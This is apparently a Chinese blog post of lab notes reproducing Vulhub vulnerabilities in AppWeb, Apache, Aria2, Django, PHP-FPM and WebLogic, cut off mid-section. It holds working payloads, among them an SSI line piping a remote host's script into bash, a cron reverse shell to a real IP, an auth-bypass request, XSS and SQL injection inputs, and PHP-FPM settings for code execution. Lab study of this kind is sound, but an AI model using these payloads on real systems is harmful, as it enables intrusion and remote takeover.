        <content type="html"><![CDATA[<blockquote><p>项目地址：<a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a></p></blockquote><a id="more"></a><p>练习优先熟悉的框架。</p><h2 id="AppWeb认证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715）"></a>AppWeb认证绕过漏洞（CVE-2018-8715）</h2><h3 id="相关介绍"><a href="#相关介绍" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>AppWeb是嵌入式Web Server。<br>AppWeb<strong>可以进行认证配置</strong>，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><p>其<strong>7.0.3之前</strong>的版本中，对于<strong>digest和form两种认证方式</strong>，如果用户传入的<strong>密码为null</strong>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用该漏洞<strong>需要知道一个已存在的用户名</strong>，当前环境下用户名为admin。<br>抓到该页面的包后，将其构造为如下数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Digest username=admin</span><br></pre></td></tr></table></figure></p><p><img src="./IDNzzoW.png" alt></p><p>如图，我们<strong>没有传入密码字段</strong>，所以服务器出现了错误，直接返回了200，而且包含了一个session。</p><p>设置这个session到浏览器，即可正常访问需要认证的页面。（复现中这一步遇到了问题）</p><h3 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h3><p>整个过程还是很好理解，关键是数据包构造正确<br><strong>关于cookie的设置：</strong><br>服务器会返回我们set-cookie头，只需要将其zai浏览器中设置即可。但是Cookie Manager不会用啊。。<br><strong>我的解决方法：</strong><br>抓到首页的包后，直接在<code>proxy</code> 模块中修改数据包，再将其发送。这样浏览器就会接收相应的响应包，并设置好cookie。</p><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><h3 id="相关介绍-1"><a href="#相关介绍-1" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本中存在一个解析漏洞</strong>，在解析PHP时，<strong>1.php\x0A</strong>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞已经在ACTF2019学习过了，参考笔记：<br><a href="https://hackmd.io/MHyg6ypiQV2AjAeqHF5dyw#%E5%88%A9%E7%94%A8Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E9%BB%91%E5%90%8D%E5%8D%95%E3%80%900a%E3%80%91" target="_blank" rel="noopener">https://hackmd.io/MHyg6ypiQV2AjAeqHF5dyw#%E5%88%A9%E7%94%A8Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E9%BB%91%E5%90%8D%E5%8D%95%E3%80%900a%E3%80%91</a></p><h3 id="知识总结-1"><a href="#知识总结-1" class="headerlink" title="知识总结"></a>知识总结</h3><ul><li>题目中上传文件的同时，也POST一个name，它的值就是上传的文件的文件名。<br>  肯定就要想到这个值就是用来在后台判断文件的！<br>  相应的就是要在这个值后面加上%0a绕过。</li><li>需要在 <code>$_POST[&#39;name&#39;]</code> 后面添加 %0a 。</li><li>需要注意的是，后台获取文件名时不能用 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>，因为他会自动把换行去掉。将会利用不成功。</li><li>访问时需要加上%0a</li></ul><h2 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h2><h3 id="相关介绍-2"><a href="#相关介绍-2" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure></p><p>其给<code>.html</code>后缀增加了media-type，值为text/html；给<code>.cn</code>后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。</p><hr><p>如果运维人员给.php后缀增加了处理器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure></p><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀，即会被识别成PHP文件，<strong>没必要是最后一个后缀</strong>。利用这个特性，将会造成一个可以<strong>绕过上传白名单</strong>的解析漏洞。（本次漏洞环境已经按如上设置好了处理器）</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>进入环境上传文件后，限制了文件后缀<br><img src="./PqObrvp.png" alt></p><hr><p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p><p><img src="./KRKnSil.png" alt></p><hr><p>菜刀可以直接连接成功：<br><img src="./vXa1tlX.png" alt><br><img src="./7YbOGdW.png" alt></p><h3 id="知识总结-2"><a href="#知识总结-2" class="headerlink" title="知识总结"></a>知识总结</h3><p>题目的关键在于设置了相关的解析处理器。<br>在文件上传漏洞中，用的较多的还有<code>.htaccess</code> 文件。</p><blockquote><p>htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。</p><p>很多时候，如果你已经安装了内容管理系统（CMS），比如Drupal，Joomla或者Wordpress，你可能会遇到.htaccess文件。 一般来说你不需要编辑它，但这个文件是你上传到Web服务器的文件之一。</p><p>.htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。</p></blockquote><p>学习资料：<br><a href="https://zhuanlan.zhihu.com/p/31763240" target="_blank" rel="noopener">htaccess文件的利用技巧</a></p><h2 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h2><h3 id="相关介绍-3"><a href="#相关介绍-3" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>当目标服务器开启了SSI与CGI支持，我们就可以上传shtml文件，利用<!--#exec cmd="id" -->语法执行命令。</p><hr><p>SSI：SSI（<strong>服务器端包含</strong>）是放置在HTML页面中的指令，并在提供页面时在服务器上进行评估。它们允许将动态生成的内容添加到现有HTML页面，而无需通过CGI程序或其他动态技术提供整个页面。<br><strong>SSI exec命令</strong>。它在文档中插入CGI脚本或shell命令的输出。</p><p>使用方法：cmd后面跟你要执行的命令就可以了。<br><code>&lt;!--#exec cmd=&quot;&quot; --&gt;</code></p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>upload.php页面支持上传<code>.shtml</code> 文件，直接构造反弹shell的命令。<br><code>&lt;!--#exec cmd=&quot;curl 47.112.16.34|bash&quot; --&gt;</code><br>命名为a.shtml<br>成功上传：<br><img src="./bEfj3Ae.png" alt><br>在服务器上监听端口。访问a.shtml文件，可以看到浏览器一直处于请求状态，服务器也已将成功反弹shell。<br><img src="./euDnyM2.png" alt></p><h3 id="知识总结-3"><a href="#知识总结-3" class="headerlink" title="知识总结"></a>知识总结</h3><p>无</p><h2 id="Aria2-任意文件写入漏洞"><a href="#Aria2-任意文件写入漏洞" class="headerlink" title="Aria2 任意文件写入漏洞"></a>Aria2 任意文件写入漏洞</h2><h3 id="相关介绍-4"><a href="#相关介绍-4" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Aria2是一个命令行下轻量级、多协议、多来源的<strong>下载工具</strong>（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建<code>XML-RPC</code>和<code>JSON-RPC</code>接口。在有权限的情况下，我们可以<strong>使用RPC接口来操作aria2来下载文件，将文件下载至任意目录</strong>，造成一个任意文件写入漏洞。</p><hr><p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/" target="_blank" rel="noopener">http://binux.github.io/yaaw/demo/</a> 。</p><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>打开yaaw，点击<code>Settings</code>按钮，填入运行aria2的目标域名：<a href="http://your-ip:6800/jsonrpc" target="_blank" rel="noopener">http://your-ip:6800/jsonrpc</a> （默认端口为6800）：<br><img src="./h0cFQKQ.png" alt></p><hr><p>通过写入一个<strong>crond任务</strong>来反弹shell<br>shell内容如下，注意使用linux生成：<br><code>* * * * * bash -i &gt; /dev/tcp/47.112.16.34/1337 0&lt;&amp;1 2&gt;&amp;1</code></p><hr><p>需要注意crontab文件的格式，以及换行符必须是<code>\n</code>，且文件结尾需要有一个换行符。<br>可以使用如下命令来查看文件内容：<br><img src="./qiWYlqS.png" alt></p><hr><p>接着将crontab文件放到自己服务器上<br>然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。<br><img src="./2nCSDFZ.png" alt><br>这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell。<br>然而我还是没有反弹成功。。。</p><h3 id="知识总结-4"><a href="#知识总结-4" class="headerlink" title="知识总结"></a>知识总结</h3><ul><li><p>crontab文件介绍<br>  当我们要增加全局性的计划任务时，一种方式是直接修改/etc/crontab。但是，一般不建议这样做，/etc/cron.d目录就是为了解决这种问题而创建的。<br>  cron执行时，也就是要读取三个地方的配置文件：一是/etc/crontab，二是/etc/cron.d目录下的所有文件，三是每个用户的配置文件</p><hr><p>  学习资料：<a href="https://blog.51cto.com/huangfu3342/1608549" target="_blank" rel="noopener">https://blog.51cto.com/huangfu3342/1608549</a></p></li><li>反弹shell新姿势——通过写入一个crond任务来反弹shell</li></ul><h2 id="Django-debug-page-XSS漏洞（CVE-2017-12794）"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）"></a>Django debug page XSS漏洞（CVE-2017-12794）</h2><h3 id="相关介绍-5"><a href="#相关介绍-5" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Django发布的新版本1.11.5，修复了500页面中可能存在的一个XSS漏洞。<br>下面是用1.11.4和1.11.5进行比较：</p><blockquote><p>git clone <code>https://github.com/django/django.git</code><br>cd django<br>git diff 1.11.4 1.11.5 django/views/debug.py</p></blockquote><p><img src="https://vulhub.org/vulhub/django/CVE-2017-12794/img/django/sp170908_035017.png" alt="link text"></p><p>外部关闭了全局转义，然后在这两个地方增加了强制转义。那么，漏洞肯定是在这个位置触发的。<br><strong>也就是将输出的内容全部进行了强制转义。</strong></p><hr><p><strong>The above exception was the direct cause of the following exception:</strong><br>一般是在<strong>出现数据库异常</strong>的时候，会抛出这样的错误语句。</p><hr><p>做个简单的测试，在Django命令行下，我们创建一个username为phith0n的用户，然后再次创建一个username为phith0n的用户，则会抛出一个IntegrityError异常：<br><img src="https://vulhub.org/vulhub/django/CVE-2017-12794/img/django/sp170908_040738.png" alt="link text"><br>见上图，原因是触发了数据库的Unique异常。</p><p>为什么Django会引入这样一个异常机制？这是为了方便开发者进行SQL错误的调试，因为<strong>Django的模型最终是操作数据库</strong>，数据库中具体出现什么错误，是Django无法100%预测的。那么，<strong>为了方便开发者快速找到是哪个操作触发了数据库异常</strong>，就需要<strong>将这两个异常回溯栈关联到一块</strong>。</p><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>P神的测试：发现在使用Postgres数据库并触发异常的时候，psycopg2<strong>会将字段名和字段值全部抛出</strong>。那么，如果字段值中包含我们可控的字符串，这个字符串其实就会被设置成<strong>cause</strong>，<strong>最后被显示在页面中</strong>。<br>流程：</p><ol><li>用户注册页面，<strong>未检查用户名</strong></li><li>注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>再次注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>触发duplicate key异常，导致XSS漏洞</li></ol><p><img src="./FBmrgdd.png" alt><br>可见，Postgres抛出的异常为</p><blockquote><p><code>duplicate key value violates unique constraint &quot;xss_user_username_key&quot;DETAIL:  Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.</code></p></blockquote><p>这个异常被拼接进<code>The above exception () was the direct cause of the following exception</code>，最后触发XSS。</p><h3 id="知识总结-5"><a href="#知识总结-5" class="headerlink" title="知识总结"></a>知识总结</h3><ul><li>关于哪个操作触发了数据库异常，需要两个异常回溯栈</li><li>两个异常都会拼接显示出来</li><li>没有合法输入检测，没有过滤输出</li></ul><h2 id="Django-lt-2-0-8-任意URL跳转漏洞（CVE-2018-14574）"><a href="#Django-lt-2-0-8-任意URL跳转漏洞（CVE-2018-14574）" class="headerlink" title="Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）"></a>Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）</h2><h3 id="相关介绍-6"><a href="#相关介绍-6" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Django默认配置下，如果匹配上的<strong>URL路由中最后一位是<code>/</code></strong>，而用户访问的时候<strong>没加<code>/</code></strong>，Django<strong>默认会跳转到带<code>/</code>的请求中</strong>。<br>（由配置项中的django.middleware.common.CommonMiddleware、APPEND_SLASH来决定）。</p><h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>该漏洞利用条件是目标<code>URLCONF</code>中存在<strong>能匹配上</strong><code>//example.com</code>的规则。</p><hr><p>在<code>path</code>开头为<code>//example.com</code>的情况下，Django没做处理，<strong>导致浏览器认为目的地址是绝对路径</strong>，最终造成任意URL跳转漏洞。</p><hr><p>docker 又出问题了，复现不了了。<br>偷图：<br><img src="https://raw.githubusercontent.com/vulhub/vulhub/master/django/CVE-2018-14574/1.png" alt="image alt"></p><h3 id="知识总结-6"><a href="#知识总结-6" class="headerlink" title="知识总结"></a>知识总结</h3><p>感觉是个无关痛痒的漏洞。</p><h2 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</h2><h3 id="相关介绍-7"><a href="#相关介绍-7" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>首看P神博客：<a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></p><p>再贴一张图：<br><img src="./p3hak8Q.png" alt></p><h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境搭建好后，Django后台的模型<code>Collection</code>的管理页面<code>http://your-ip:port/admin/vuln/collection/</code></p><p>其中<code>detail</code>是模型<code>Collection中的JSONField</code><br><img src="./hXN92Qz.png" alt></p><p>在<code>GET</code>参数中构造<code>detail__a&#39;b=123</code>提交<br><img src="./SXJM6ja.png" alt><br>可以看到报错语句，说明这里存在SQL注入。<br>exp姿势：<br><a href="https://nosec.org/home/detail/2831.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2831.html</a><br><a href="https://xz.aliyun.com/t/5896" target="_blank" rel="noopener">https://xz.aliyun.com/t/5896</a><br>exp没看太懂，留个坑。。</p><h3 id="知识总结-7"><a href="#知识总结-7" class="headerlink" title="知识总结"></a>知识总结</h3><ul><li>Postgresql支持的数据类型更加丰富，其对JSON格式数据的支持也让这个关系型数据库拥有了NoSQL的一些特点。<br>  在Django中也支持了Postgresql的数据类型：<ul><li>JSONField</li><li>ArrayField</li><li>HStoreField</li></ul></li><li>该漏洞需要开发者使用了<code>JSONField/HStoreField</code>，且用户可控<code>queryset</code>查询时的键名，在键名的位置注入SQL语句。<strong>Django自带的后台应用Django-Admin中就存在这样的写法。</strong></li><li>exp好好学习</li></ul><h2 id="PHP-FPM-Fastcgi-未授权访问漏洞"><a href="#PHP-FPM-Fastcgi-未授权访问漏洞" class="headerlink" title="PHP-FPM Fastcgi 未授权访问漏洞"></a>PHP-FPM Fastcgi 未授权访问漏洞</h2><h3 id="相关介绍-8"><a href="#相关介绍-8" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>大二的时候在web组组会的时候，学长就要我们看会这个漏洞。奈何当初静不下心来，今天好好搞懂，总结一下。（<strong>学习链接</strong>：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> ）</p><hr><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><ul><li>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</li><li>fastcgi协议是服务器中间件和某个语言后端进行数据交换的协议。</li><li>Fastcgi协议由多个record组成。<br>  record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</li><li>FPM是一个fastcgi<strong>协议解析器</strong>。<br>  Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</li></ul><hr><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">    <span class="string">'REQUEST_METHOD'</span>: <span class="string">'GET'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_FILENAME'</span>: <span class="string">'/var/www/html/index.php'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_NAME'</span>: <span class="string">'/index.php'</span>,</span><br><span class="line">    <span class="string">'QUERY_STRING'</span>: <span class="string">'?a=1&amp;b=2'</span>,</span><br><span class="line">    <span class="string">'REQUEST_URI'</span>: <span class="string">'/index.php?a=1&amp;b=2'</span>,</span><br><span class="line">    <span class="string">'DOCUMENT_ROOT'</span>: <span class="string">'/var/www/html'</span>,</span><br><span class="line">    <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">    <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'REMOTE_PORT'</span>: <span class="string">'12345'</span>,</span><br><span class="line">    <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">    <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p><hr><h4 id="Nginx（IIS7）解析漏洞"><a href="#Nginx（IIS7）解析漏洞" class="headerlink" title="Nginx（IIS7）解析漏洞"></a>Nginx（IIS7）解析漏洞</h4><p>该漏洞现象是，在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时，访问到的文件是favicon.ico，但却按照.php后缀解析了。</p><p>用户请求<code>http://127.0.0.1/favicon.ico/.php，nginx</code>将会发送如下环境变量到fpm里：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'SCRIPT_FILENAME'</span>: <span class="string">'/var/www/html/favicon.ico/.php'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_NAME'</span>: <span class="string">'/favicon.ico/.php'</span>,</span><br><span class="line">    <span class="string">'REQUEST_URI'</span>: <span class="string">'/favicon.ico/.php'</span>,</span><br><span class="line">    <span class="string">'DOCUMENT_ROOT'</span>: <span class="string">'/var/www/html'</span>,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>正常来说，SCRIPT_FILENAME的值是一个不存在的文件<code>/var/www/html/favicon.ico/.php</code>，是PHP设置中的一个选项fix_pathinfo导致了这个漏洞。PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，fpm会判断SCRIPT_FILENAME是否存在，如果不存在则去掉最后一个/及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p><p>所以，第一次fpm发现<code>/var/www/html/favicon.ico/.php</code>不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p><p>正确的解决方法有两种，一是在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。</p><h3 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li>PHP-FPM默认监听9000端口，<strong>如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</strong></li><li><code>SCRIPT_FILENAME</code>的值格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404.</li><li>如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。<br>  使用源安装php后，默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</li><li><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件。</li><li><code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</li><li>设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要<strong>把待执行的代码放在Body中</strong>，他们就能被执行了。</li><li>还需要开启远程文件包含选项<code>allow_url_include</code>。</li><li><code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项。</li><li><code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</li><li>最后传入如下环境变量：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">    <span class="string">'REQUEST_METHOD'</span>: <span class="string">'GET'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_FILENAME'</span>: <span class="string">'/var/www/html/index.php'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_NAME'</span>: <span class="string">'/index.php'</span>,</span><br><span class="line">    <span class="string">'QUERY_STRING'</span>: <span class="string">'?a=1&amp;b=2'</span>,</span><br><span class="line">    <span class="string">'REQUEST_URI'</span>: <span class="string">'/index.php?a=1&amp;b=2'</span>,</span><br><span class="line">    <span class="string">'DOCUMENT_ROOT'</span>: <span class="string">'/var/www/html'</span>,</span><br><span class="line">    <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">    <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'REMOTE_PORT'</span>: <span class="string">'12345'</span>,</span><br><span class="line">    <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">    <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span></span><br><span class="line">    <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">    <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>直接使用exp进行利用：（exp地址：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a> ）<br><img src="./Qi4K7e6.png" alt></p><hr><p>帮助选项：<br><img src="./MCUzhIC.png" alt></p><h3 id="知识总结-8"><a href="#知识总结-8" class="headerlink" title="知识总结"></a>知识总结</h3><p>一个有趣的漏洞，原理P神讲得太透彻了，exp也很好用。<br>好好学习，天天向上。</p><h2 id="Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h2><p>weblogic还不是很熟悉，这几天把weblogic的洞都过一遍，工具一把梭。</p><h3 id="相关介绍-9"><a href="#相关介绍-9" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Weblogic的<strong>WLS Security组件对外提供webservice服务</strong>，其中使用了<strong>XMLDecoder来解析用户传入</strong>的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h3 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>P神的docker搭建好后没有反应，用的春哥的docker<br><img src="./ZIgwg7n.png" alt></p><p>console控制台<br><img src="./IvB4k0T.png" alt></p><hr><p>直接上工具：</p><ul><li><img src="./sTeqYnk.png" alt></li><li><img src="./5egn7et.png" alt></li></ul><p>用的太舒服了 </p><h3 id="知识总结-9"><a href="#知识总结-9" class="headerlink" title="知识总结"></a>知识总结</h3><p>java的洞实在是太多了</p><h2 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h2><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS 